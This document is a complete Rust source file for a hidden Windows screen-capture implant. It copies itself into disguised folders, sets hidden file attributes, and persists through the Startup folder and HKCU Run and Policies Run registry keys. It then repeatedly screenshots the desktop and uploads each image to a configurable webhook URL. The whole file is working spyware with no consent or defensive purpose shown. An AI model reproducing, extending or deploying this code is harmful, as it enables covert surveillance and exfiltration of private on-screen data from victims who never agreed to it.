#![windows_subsystem = "windows"]

use std::ptr;

const WEBHOOK_URL: &str = "__WEBHOOK_URL__";
const INTERVAL_SECS: &str = "__INTERVAL_SECS__";
const BOUNDARY: &str = "----ScrenBoundary7d1f3a9c2b";

type HANDLE = isize;
type HDC = isize;
type HBITMAP = isize;
type HGDIOBJ = isize;

const SRCCOPY: u32 = 0x00CC0020;
const HKEY_CURRENT_USER: HANDLE = 0x80000001u32 as i32 as isize;
const KEY_SET_VALUE: u32 = 0x0002;
const KEY_CREATE_SUB_KEY: u32 = 0x0004;
const REG_SZ: u32 = 1;
const ERROR_ALREADY_EXISTS: u32 = 183;
const FILE_ATTRIBUTE_HIDDEN: u32 = 0x00000002;
const WINHTTP_FLAG_SECURE: u32 = 0x00800000;
const WINHTTP_ACCESS_TYPE_DEFAULT_PROXY: u32 = 0;

#[repr(C)]
#[derive(Clone, Copy)]
struct BitmapInfoHeader {
    bi_size: u32,
    bi_width: i32,
    bi_height: i32,
    bi_planes: u16,
    bi_bit_count: u16,
    bi_compression: u32,
    bi_size_image: u32,
    bi_x_pels_per_meter: i32,
    bi_y_pels_per_meter: i32,
    bi_clr_used: u32,
    bi_clr_important: u32,
}

#[repr(C)]
struct BitmapInfo {
    header: BitmapInfoHeader,
    colors: [u32; 1],
}

#[link(name = "user32")]
extern "system" {
    fn GetDC(hwnd: HANDLE) -> HDC;
    fn ReleaseDC(hwnd: HANDLE, hdc: HDC) -> i32;
    fn GetSystemMetrics(index: i32) -> i32;
}

#[link(name = "gdi32")]
extern "system" {
    fn CreateCompatibleDC(hdc: HDC) -> HDC;
    fn CreateCompatibleBitmap(hdc: HDC, w: i32, h: i32) -> HBITMAP;
    fn SelectObject(hdc: HDC, obj: HGDIOBJ) -> HGDIOBJ;
    fn StretchBlt(
        dst: HDC,
        x: i32,
        y: i32,
        w: i32,
        h: i32,
        src: HDC,
        sx: i32,
        sy: i32,
        sw: i32,
        sh: i32,
        rop: u32,
    ) -> i32;
    fn GetDIBits(
        hdc: HDC,
        bmp: HBITMAP,
        start: u32,
        count: u32,
        bits: *mut u8,
        info: *mut BitmapInfo,
        usage: u32,
    ) -> i32;
    fn DeleteObject(obj: HGDIOBJ) -> i32;
    fn DeleteDC(hdc: HDC) -> i32;
}

#[link(name = "winhttp")]
extern "system" {
    fn WinHttpOpen(
        agent: *const u16,
        access: u32,
        proxy: *const u16,
        bypass: *const u16,
        flags: u32,
    ) -> HANDLE;
    fn WinHttpConnect(session: HANDLE, server: *const u16, port: u16, reserved: u32) -> HANDLE;
    fn WinHttpOpenRequest(
        conn: HANDLE,
        verb: *const u16,
        object: *const u16,
        version: *const u16,
        referrer: *const u16,
        accept: *const *const u16,
        flags: u32,
    ) -> HANDLE;
    fn WinHttpSetTimeouts(
        handle: HANDLE,
        resolve: i32,
        connect: i32,
        send: i32,
        receive: i32,
    ) -> i32;
    fn WinHttpSendRequest(
        req: HANDLE,
        headers: *const u16,
        headers_len: u32,
        body: *mut u8,
        body_len: u32,
        total_len: u32,
        context: usize,
    ) -> i32;
    fn WinHttpReceiveResponse(req: HANDLE, reserved: *mut u8) -> i32;
    fn WinHttpCloseHandle(handle: HANDLE) -> i32;
}

#[link(name = "advapi32")]
extern "system" {
    fn RegOpenKeyExW(
        key: HANDLE,
        sub: *const u16,
        options: u32,
        rights: u32,
        out: *mut HANDLE,
    ) -> i32;
    fn RegSetValueExW(
        key: HANDLE,
        name: *const u16,
        reserved: u32,
        ty: u32,
        data: *const u8,
        len: u32,
    ) -> i32;
    fn RegCloseKey(key: HANDLE) -> i32;
}

#[link(name = "kernel32")]
extern "system" {
    fn CreateMutexW(attrs: *mut u8, initial: i32, name: *const u16) -> HANDLE;
    fn GetLastError() -> u32;
    fn SetLastError(code: u32);
    fn SetFileAttributesW(path: *const u16, attrs: u32) -> i32;
}

fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn single_instance() -> bool {
    unsafe {
        let name = wide("Local\\clientOneInstance");
        SetLastError(0);
        let mutex = CreateMutexW(ptr::null_mut(), 1, name.as_ptr());
        let err = GetLastError();
        mutex != 0 && err != ERROR_ALREADY_EXISTS
    }
}

fn same_path(a: &std::path::Path, b: &std::path::Path) -> bool {
    a.to_string_lossy().eq_ignore_ascii_case(&b.to_string_lossy())
}

fn resolve_target() -> std::path::PathBuf {
    let exe = std::env::current_exe().unwrap_or_default();

    if let Ok(profile) = std::env::var("USERPROFILE") {
        let target = std::path::PathBuf::from(profile).join("client.exe");
        if same_path(&exe, &target) {
            return target;
        }
        if std::fs::copy(&exe, &target).is_ok() {
            return target;
        }
    }

    let base = std::env::var("LOCALAPPDATA")
        .or_else(|_| std::env::var("APPDATA"))
        .unwrap_or_else(|_| std::env::temp_dir().to_string_lossy().into_owned());
    let dir = std::path::PathBuf::from(base)
        .join("Microsoft")
        .join("Windows")
        .join("Scren");
    let _ = std::fs::create_dir_all(&dir);
    let fallback = dir.join("client.exe");
    if !same_path(&exe, &fallback) {
        let _ = std::fs::copy(&exe, &fallback);
    }
    fallback
}

fn hide(path: &std::path::Path) {
    unsafe {
        SetFileAttributesW(wide(&path.to_string_lossy()).as_ptr(), FILE_ATTRIBUTE_HIDDEN);
    }
}

fn write_run_value(sub: &str, target: &std::path::Path) {
    let data = wide(&target.to_string_lossy().into_owned());
    let sub_key = wide(sub);
    let name = wide("client");
    unsafe {
        let mut key: HANDLE = 0;
        if RegOpenKeyExW(
            HKEY_CURRENT_USER,
            sub_key.as_ptr(),
            0,
            KEY_SET_VALUE | KEY_CREATE_SUB_KEY,
            &mut key,
        ) == 0
        {
            RegSetValueExW(
                key,
                name.as_ptr(),
                0,
                REG_SZ,
                data.as_ptr() as *const u8,
                (data.len() * 2) as u32,
            );
            RegCloseKey(key);
        }
    }
}

fn install_persistence(target: &std::path::Path) {
    hide(target);

    if let Ok(appdata) = std::env::var("APPDATA") {
        let base = std::path::PathBuf::from(&appdata);

        let startup = base
            .join("Microsoft")
            .join("Windows")
            .join("Start Menu")
            .join("Programs")
            .join("Startup");
        if startup.is_dir() {
            let copy = startup.join("client.exe");
            if !same_path(target, &copy) {
                let _ = std::fs::copy(target, &copy);
            }
            hide(&copy);
        }

        let backup_dir = base.join("Microsoft").join("Windows").join("Scren");
        let _ = std::fs::create_dir_all(&backup_dir);
        hide(&backup_dir);
        let backup = backup_dir.join("client.exe");
        if !same_path(target, &backup) {
            let _ = std::fs::copy(target, &backup);
        }
        hide(&backup);
    }

    write_run_value("Software\\Microsoft\\Windows\\CurrentVersion\\Run", target);
    write_run_value(
        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
        target,
    );
}

fn capture_png() -> Option<Vec<u8>> {
    unsafe {
        let screen_w = GetSystemMetrics(0);
        let screen_h = GetSystemMetrics(1);
        if screen_w <= 0 || screen_h <= 0 {
            return None;
        }

        let max_w = 1280;
        let (w, h) = if screen_w > max_w {
            (max_w, (screen_h * max_w / screen_w).max(1))
        } else {
            (screen_w, screen_h)
        };

        let screen = GetDC(0);
        if screen == 0 {
            return None;
        }
        let mem = CreateCompatibleDC(screen);
        let bmp = CreateCompatibleBitmap(screen, w, h);
        let old = SelectObject(mem, bmp);

        let blitted = StretchBlt(
            mem, 0, 0, w, h, screen, 0, 0, screen_w, screen_h, SRCCOPY,
        );

        let mut pixels = vec![0u8; w as usize * 4 * h as usize];
        let mut info = BitmapInfo {
            header: BitmapInfoHeader {
                bi_size: 40,
                bi_width: w,
                bi_height: -h,
                bi_planes: 1,
                bi_bit_count: 32,
                bi_compression: 0,
                bi_size_image: (w * 4 * h) as u32,
                bi_x_pels_per_meter: 0,
                bi_y_pels_per_meter: 0,
                bi_clr_used: 0,
                bi_clr_important: 0,
            },
            colors: [0; 1],
        };
        let grabbed = GetDIBits(
            mem,
            bmp,
            0,
            h as u32,
            pixels.as_mut_ptr(),
            &mut info,
            0,
        );

        SelectObject(mem, old);
        DeleteObject(bmp);
        DeleteDC(mem);
        ReleaseDC(0, screen);

        if blitted == 0 || grabbed == 0 {
            return None;
        }
        Some(encode_png(&pixels, w as usize, h as usize))
    }
}

fn crc32(data: &[u8]) -> u32 {
    let mut table = [0u32; 256];
    for (i, entry) in table.iter_mut().enumerate() {
        let mut c = i as u32;
        for _ in 0..8 {
            c = if c & 1 != 0 {
                0xEDB88320 ^ (c >> 1)
            } else {
                c >> 1
            };
        }
        *entry = c;
    }
    let mut crc = 0xFFFF_FFFFu32;
    for &b in data {
        crc = table[((crc ^ b as u32) & 0xFF) as usize] ^ (crc >> 8);
    }
    !crc
}

fn push_chunk(out: &mut Vec<u8>, kind: &[u8; 4], data: &[u8]) {
    out.extend_from_slice(&(data.len() as u32).to_be_bytes());
    out.extend_from_slice(kind);
    out.extend_from_slice(data);
    let mut check = Vec::with_capacity(4 + data.len());
    check.extend_from_slice(kind);
    check.extend_from_slice(data);
    out.extend_from_slice(&crc32(&check).to_be_bytes());
}

fn zlib_stored(data: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(data.len() + data.len() / 64 + 64);
    out.push(0x78);
    out.push(0x01);
    let mut pos = 0usize;
    loop {
        let n = std::cmp::min(65535usize, data.len() - pos);
        let last = pos + n == data.len();
        out.push(if last { 1 } else { 0 });
        out.extend_from_slice(&(n as u16).to_le_bytes());
        out.extend_from_slice(&(!(n as u16)).to_le_bytes());
        out.extend_from_slice(&data[pos..pos + n]);
        pos += n;
        if last {
            break;
        }
    }
    let mut a = 1u32;
    let mut b = 0u32;
    for &x in data {
        a = (a + x as u32) % 65521;
        b = (b + a) % 65521;
    }
    out.extend_from_slice(&((b << 16) | a).to_be_bytes());
    out
}

fn encode_png(pixels: &[u8], w: usize, h: usize) -> Vec<u8> {
    let mut raw = Vec::with_capacity(h * (1 + w * 3));
    for y in 0..h {
        raw.push(0);
        let base = y * w * 4;
        for x in 0..w {
            let i = base + x * 4;
            raw.push(pixels[i + 2]);
            raw.push(pixels[i + 1]);
            raw.push(pixels[i]);
        }
    }

    let compressed = zlib_stored(&raw);
    let mut out = Vec::with_capacity(compressed.len() + 128);
    out.extend_from_slice(&[137, 80, 78, 71, 13, 10, 26, 10]);

    let mut ihdr = Vec::with_capacity(13);
    ihdr.extend_from_slice(&(w as u32).to_be_bytes());
    ihdr.extend_from_slice(&(h as u32).to_be_bytes());
    ihdr.push(8);
    ihdr.push(2);
    ihdr.push(0);
    ihdr.push(0);
    ihdr.push(0);
    push_chunk(&mut out, b"IHDR", &ihdr);
    push_chunk(&mut out, b"IDAT", &compressed);
    push_chunk(&mut out, b"IEND", &[]);
    out
}

fn parse_url(url: &str) -> Option<(&str, String)> {
    let rest = url.strip_prefix("https://")?;
    let slash = rest.find('/')?;
    let mut host = &rest[..slash];
    let path = &rest[slash..];
    if let Some(colon) = host.rfind(':') {
        host = &host[..colon];
    }
    if host.is_empty() || path.is_empty() {
        return None;
    }
    Some((host, path.to_string()))
}

fn send_webhook(png: &[u8]) -> bool {
    let (host, path) = match parse_url(WEBHOOK_URL) {
        Some(v) => v,
        None => return false,
    };

    let mut body = Vec::with_capacity(png.len() + 256);
    body.extend_from_slice(
        format!(
            "--{}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"screen.png\"\r\nContent-Type: image/png\r\n\r\n",
            BOUNDARY
        )
        .as_bytes(),
    );
    body.extend_from_slice(png);
    body.extend_from_slice(format!("\r\n--{}--\r\n", BOUNDARY).as_bytes());

    let headers = wide(&format!(
        "Content-Type: multipart/form-data; boundary={}\r\n",
        BOUNDARY
    ));
    let agent = wide("scren/1.0");
    let server = wide(host);
    let object = wide(&path);
    let verb = wide("POST");

    unsafe {
        let session = WinHttpOpen(
            agent.as_ptr(),
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            ptr::null(),
            ptr::null(),
            0,
        );
        if session == 0 {
            return false;
        }
        WinHttpSetTimeouts(session, 5000, 5000, 10000, 30000);

        let conn = WinHttpConnect(session, server.as_ptr(), 443, 0);
        if conn == 0 {
            WinHttpCloseHandle(session);
            return false;
        }

        let req = WinHttpOpenRequest(
            conn,
            verb.as_ptr(),
            object.as_ptr(),
            ptr::null(),
            ptr::null(),
            ptr::null(),
            WINHTTP_FLAG_SECURE,
        );
        if req == 0 {
            WinHttpCloseHandle(conn);
            WinHttpCloseHandle(session);
            return false;
        }

        let ok = WinHttpSendRequest(
            req,
            headers.as_ptr(),
            u32::MAX,
            body.as_mut_ptr(),
            body.len() as u32,
            body.len() as u32,
            0,
        );
        if ok != 0 {
            WinHttpReceiveResponse(req, ptr::null_mut());
        }

        WinHttpCloseHandle(req);
        WinHttpCloseHandle(conn);
        WinHttpCloseHandle(session);
        ok != 0
    }
}

fn main() {
    let exe = std::env::current_exe().unwrap_or_default();
    let target = resolve_target();

    if !same_path(&exe, &target) {
        install_persistence(&target);
        let _ = std::process::Command::new(&target).spawn();
        return;
    }

    install_persistence(&target);
    if !single_instance() {
        return;
    }

    loop {
        if let Some(png) = capture_png() {
            let _ = send_webhook(&png);
        }
        let secs = INTERVAL_SECS.parse().unwrap_or(10);
        std::thread::sleep(std::time::Duration::from_secs(secs));
    }
}
